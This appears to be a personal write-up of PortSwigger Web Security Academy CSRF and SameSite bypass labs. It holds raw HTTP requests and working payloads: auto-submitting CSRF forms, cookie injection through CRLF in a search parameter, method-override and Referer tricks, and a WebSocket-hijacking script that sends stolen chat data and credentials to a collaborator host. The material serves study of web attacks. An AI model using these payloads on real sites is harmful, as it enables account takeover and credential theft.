# Encounters with CSRFs

# Without any defenses
Get the victim to change their email address to one of your choosing. 
## Observations
- Can login with default user. 
- Can change email address of my user without any CSRF token. 
- Used Burp's generate CSRF function to craft a CSRF and sent it through. 
Original request:
```
POST /my-account/change-email HTTP/2
Host: 0ac200e90406e4b08037f85a001000a1.web-security-academy.net
Cookie: session=ex1py4NfnBdRM2JAHHD785lrMuIkZ9SG
Content-Length: 22
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: https://0ac200e90406e4b08037f85a001000a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac200e90406e4b08037f85a001000a1.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=test%40email.com
```
Payload:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ac200e90406e4b08037f85a001000a1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# CSRF where token validation depends on request method
Change victim's email address
## Observations
- Can login with default account. 
- Can change email address with a CSRF token on the POST request:
Original request:
```
POST /my-account/change-email HTTP/2
Host: 0acf00e803bb5468805b0dad00750023.web-security-academy.net
Cookie: session=opYFqrm5L3kcHFyuZXtJYcf86AML1iS6
Content-Length: 60
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: https://0acf00e803bb5468805b0dad00750023.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0acf00e803bb5468805b0dad00750023.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=test%40email.com&csrf=LVP4qqjEnqIfkqdQnDQNMGtII14tKuzz
```
Modified request with Burp's change request type function and cut the CSRF token off the URL:
```
GET /my-account/change-email?email=test%40foo.com HTTP/2
Host: 0acf00e803bb5468805b0dad00750023.web-security-academy.net
Cookie: session=opYFqrm5L3kcHFyuZXtJYcf86AML1iS6
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: https://0acf00e803bb5468805b0dad00750023.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0acf00e803bb5468805b0dad00750023.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
Generated a CSRF payload with Burp but it defaults to a form (POST) so I modified it to just pull the script source with the proper payload:
```
<html>
  <body>
    <script src="https://0acf00e803bb5468805b0dad00750023.web-security-academy.net/my-account/change-email?email=test%40test.com">
    </script>
  </body>
</html>
```

# CSRF where token validation depends on token being present
Change the victim's email.
## Observations
- The form has a CSRF token but if I delete it and send it through the function works anyhow. 
Created a payload with Burp:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1f006b037fd410809f1cbe003f0060.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# CSRF where token is not tied to user session
Change the user's email
## Observations
- Provided two accounts carlos and peter which is unusual
- Can change emails and form has CSRF tokens
- Found that as long as CSRF token is valid, it doesn't matter which account is used so its not tied to the user's account but just validated for simply being valid. Meaning, we can take out CSRF token, put it in the payload and it should work to change the victim's email. 
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ae700c60336907f80e417ab005b00d3.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="2nKP9xvFJsCPiHdQVRJbRqvpWPtWv9VL" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Just make sure to grab a fresh CSRF token from the form before delivery so that  you aren't submitting a used token. 

# CSRF where token is tied to non-session cookie
Change the user's email address
## Observations
- Provided two accounts
- There is a ```csrfKey``` cookie which I haven't seen in other encounters. 
- I did a password change on the first account then logged into the second account in a private tab, copied the session token over the repeater for the first account's email change and found that the ```csrfKey``` cookie and the csrftoken value can be reused and aren't tied to the account; they just need to be valid. 
- Simply providing a CSRF payload via the exploit server doesn't work. So, there needs to be another way to deliver it. 
- Found that performing a search sets a cookie: ```Set-Cookie: LastSearchTerm=test; Secure; HttpOnly```
- What we can do is use the search function and a new line character to set the csrfKey value using the CSRF vuln.
```
test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```
URL decoded:
```
test
Set-Cookie: csrfKey=YOUR-KEY; SameSite=None
```
Demo request:
```
GET /?search=test%0d%0aSet-Cookie:%20csrfKey=ngSY57IjtDNaUYgrZTbuOdRW3SifBlJ6%3b%20SameSite=None HTTP/2
Host: 0a0600e0042cd70a8165163700840060.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0600e0042cd70a8165163700840060.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
Demo response:
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=ngSY57IjtDNaUYgrZTbuOdRW3SifBlJ6; SameSite=None; Secure; HttpOnly
Set-Cookie: session=OkwBhswzrQCqKS40TENANyRRU4gpO49q; Secure; HttpOnly; SameSite=None
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3479
```
So, when a user visits the page and doesn't have that value set or has it set we can write/overwrite it. 

To craft the final payload we need to do the CSRF payload with Burp but instead of doing a form submission right away we need the victim to visit the search function to get my csrfKey set first. To do that we have to modify the script block where the autosubmit occurs to instead use an img tag to load that request then submit. 
That process starts with the change email CSRF POC:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0600e0042cd70a8165163700840060.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;foo&#46;com" />
      <input type="hidden" name="csrf" value="csCJI1Bjc7xdVDWwpIqnWIQiXXq9QUli" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Then we replace the script block with the img:
```
<img src="0a0600e0042cd70a8165163700840060.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ngSY57IjtDNaUYgrZTbuOdRW3SifBlJ6%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
Final payload looks like this:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6400e4044c87d080903ae100360005.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="TYqb72ylgz22MgKOVcX8lgsABArV7KyH" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a6400e4044c87d080903ae100360005.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=csaHzzNZDAVkXO5moGhEEt7qEZ7o8T5B%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

# CSRF where token is duplicated in cookie
Change victim's email. 
## Observations 
- Tries to use a double submit CSRF protection method but its insecure. 
- Similarly to others, the search function has no CSRF protections on it and the search term is set as a cookie value, meaning with a new line we can set a cookie. 
- The cookie for the csrf is the same value as the actual csrf token so we can effectively just overwrite the victim's csrf because there isn't any actual validation. 
- Crafting the payload:
```
test%0d%0aSet-Cookie:%20csrf=YOUR-KEY%3b%20SameSite=None
```
Grabbed a search in the proxy interceptor and set that value in the search param (it will double URL encode if you do it in the UI). This did override/set the cookie for the csrf. 
Request:
```
GET /?search=test%0d%0aSet-Cookie%3A+csrf%3DYOUR-KEY%3B+SameSite%3DNone HTTP/2
Host: 0ada00610488d3db81eaa3a600d70061.web-security-academy.net
Cookie:  session=bCCp5JV9JjGZxlGw27DD0g8mwlKMdkod
```
Response:
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrf=YOUR-KEY; SameSite=None; Secure; HttpOnly
```
Testing to see if, as long as they match, the two csrf's can be any value, they can:
```
POST /my-account/change-email HTTP/2
Host: 0ada00610488d3db81eaa3a600d70061.web-security-academy.net
Cookie: csrf=foo; session=bCCp5JV9JjGZxlGw27DD0g8mwlKMdkod
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: https://0ada00610488d3db81eaa3a600d70061.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ada00610488d3db81eaa3a600d70061.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

email=Test%40email.com&csrf=foo
```

So this final payload should work:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ada00610488d3db81eaa3a600d70061.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="Test&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="foo" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0ada00610488d3db81eaa3a600d70061.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=foo%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```



# SameSite Lax bypass via method override
Change the email. 
## Observations
SameSite is a flag on cookies that tells the browser when to include them in cross-site requests:
	•	Strict → never send cookies on cross-site requests.
	•	Lax → send cookies only on top-level navigations using “safe” HTTP methods (like GET).
	•	None; Secure → always send cookies cross-site, but must be over HTTPS.

With Lax:
	•	Blocked: Cookies are not sent with cross-site POSTs, iframes, or subresource requests (like <img> or AJAX from another origin). This mitigates CSRF somewhat.
	•	Allowed: Cookies are sent with top-level navigations using safe methods (GET, HEAD, OPTIONS, TRACE).

Top level navigation is when the entire tab changes to a new URL. 

So if a malicious site tricks a user into clicking a link:
```
<a href="https://victim.com/account/delete">Click me!</a>
```
that is a top level nagivation via GET > the victim's browser includes the session cookie, because SameSite=Lax permits it. 

- The session cookie is not set to any SameSite level when logging in or changing emails so by default it falls back to LAX. 
- This means we could get a CSRF since there are no other protections if we can get top-level navigation to work with the right method (the form only accepts POST requests). With "change request method" to GET we get "Method not allowed" but we may still be able to pass parameters via a URL if we add the ```_method``` parameter to the URL:
```
GET /my-account/change-email?email=test%40email.com&_method=POST HTTP/2
Host: 0a7c00a004d0aad880a9030900ac002b.web-security-academy.net
Cookie: session=xw4XRa3l7jloo6xTHiiCtFlOXQTdaqVQ
```
^ this works. So, we can craft a CSRF this way and deliver it. 
Final payload:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a7c00a004d0aad880a9030900ac002b.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="hidden" name="&#95;method" value="POST" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# SameSite Strict bypass via client-side redirect
Change email
## Observations
- SameSite set to Strict. 
- No CSRF token
- Blog allows comments and automatically redirects you back to the blog after commenting which is a new change.
/resources/js/commentConfirmationRedirect.js:
```
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
- The JS uses postId query parameter to dynamically construct the path for the client-side redirect. So, we can do something like this:
```
https://0aba0023041622cd80172161009600cd.web-security-academy.net/post/comment/confirmation?postId=2../../../my-account
```
This will get us back to the my-account page after 3 seconds. So, we could use that in combination with a CSRF payload in a GET request to change the victim's email. It does allow email change via GET with params in the URL. 

- This won't even require a fancy CSRF payload from Burp, just a simple script that loads that GET request:
```
<script>
    document.location = "https://0aba0023041622cd80172161009600cd.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```

# SameSite Strict bypass via sibling domain
Steal login credentials
## Observations
- There is a chat on this site which is different. 
- Chat runs over websockets. 
- Starting a chat starts with a 'READY' message. 
- Probably a Cross-Site Web Socket Hijacking vuln. 
- See if they click on or if we can get a CSWSH:
```
<script>
    var ws = new WebSocket('wss://0aaa0093037a1d9c818af733002c00df.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
- It works, this opens a new chat session and sends the response to the collaborator server. 
- Nothing really all that great to be seen here so far, the session token isn't sent to the chat and its SameSite=Strict. 
- Looking at the proxy history, we see that images and script responses have an Access-Control-Allow-Origin header in the response from a sibling domain - cms-*.web-security.com
- The CMS page is a login page that has reflected XSS in the username field. AND it does pass the session token in the cookies. So, we could get the bot submit a request there and potentially steal their cookies. 
-- To do this, we can take the original CSWSH payload which was JS and URL encoded it, submit that as the username which will parse the JS and send it through to the victim as a script via the exploit server. 
```
<script>
document.location = "https://cms-0aaa0093037a1d9c818af733002c00df.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0d%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%61%61%30%30%39%33%30%33%37%61%31%64%39%63%38%31%38%61%66%37%33%33%30%30%32%63%30%30%64%66%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0d%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0d%0a%20%20%20%20%7d%3b%0d%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%6a%66%32%6b%37%33%71%63%68%6a%78%30%69%63%33%67%77%69%77%38%35%6a%6a%70%70%67%76%37%6a%36%37%76%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0d%0a%20%20%20%20%7d%3b%0d%0a%3c%2f%73%63%72%69%70%74%3e&password=anything";
</script>
```
- User Carlos starts a session and autologs-in to the portal which gets passedinto the session with the chat so we get that data to the Burp Collaborator server and can log in as him. 


# SameSite Lax bypass via cookie refresh
Change email

## Observations
- Oauth authentication
- cookies being set by the Oauth IDP are being set with lax or none. 
Example:
Request:
```
GET /oauth-callback?code=rVY_YRGHbVgk__3Uu5eLjWfrpozAMGAzADAmVsS1bLG HTTP/2
Host: 0a4d00580475b6ed803a12e600370062.web-security-academy.net
```
Response:
```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=QpOL9Vu2TsavB6tP0UUvC2AFLCOqA6oJ; Expires=Mon, 08 Sep 2025 16:01:02 UTC; Secure; HttpOnly
```
- Testing basic CSRF with BurpSuite's payload and I am redirected to refresh my authentication with Oauth. 
- Try it again right after that and it succeeds without reauthing. 
- Anytime you visit the /social-login page it with initiate the OAuth flow or refresh your session. This sets a new session token each time. 
-- Essentially, if we try to get CSRF on someone who hasn't just logged in then its going to push them off the page to complete the OAuth flow and break out CSRF. 
- Trying to initiate the social-login without direct interaction fails because it won't allow us to pop-up the window. We need the user to interact with the page. So, we could use an on-click event to make that interaction occur since the vicitm will need to click on the page at some point. 
```
<form method="POST" action="https://0a4d00580475b6ed803a12e600370062.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://0a4d00580475b6ed803a12e600370062.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```
That interaction pops out the OAuth flow into a new window and after the refresh completes the CSRF successfully executes. 

# CSRF where Referer validation depends on header being present
Change the victim's email address
## Observations
- No CSRF in the login function
- Changing the value of referrer header errors the login function out as invalid. So, let's see if it actually depends on it or if it'll accept the login request without one. This might be a very weak CSRF prevention implementation - it does not. Simply delete the header and you're back in business. We do that by adding a meta tag directive. 
```
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body onload="document.forms[0].submit()">
  <form action="https://0ab100960309be1c80d921d0006d00ca.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="test@test.com">
  </form>
</body>
</html>
```

# CSRF with broken Referer validation
Change victim's email address.
## Observations
- No CSRF token. 
- Referrer header stripping doesn't work - invalid
- What it turns out to be doing is validating the string exists, not that it is correctly formatted so this works as a valid referrer header:
```
Referer: https://foobaloo.evil.com?0a5400a803393ab8e43be09900a500aa.web-security-academy.net/my-account
```
- What we can do is something similiar to above, set the referrer directive but this time to "unsafe-url" which directs the browser to include the full URL of the page in the referer header (scheme + host + path + query) which isn't typical. Default strict-origin-when-cross-origin policies would normall prevent the path and query. Then, we append the URL as the query to satisfy the referer policy check.
```
<html>
  <head>
  <meta name="referrer" content="unsafe-url">
  </head>
   <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5400a803393ab8e43be09900a500aa.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0a5400a803393ab8e43be09900a500aa.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
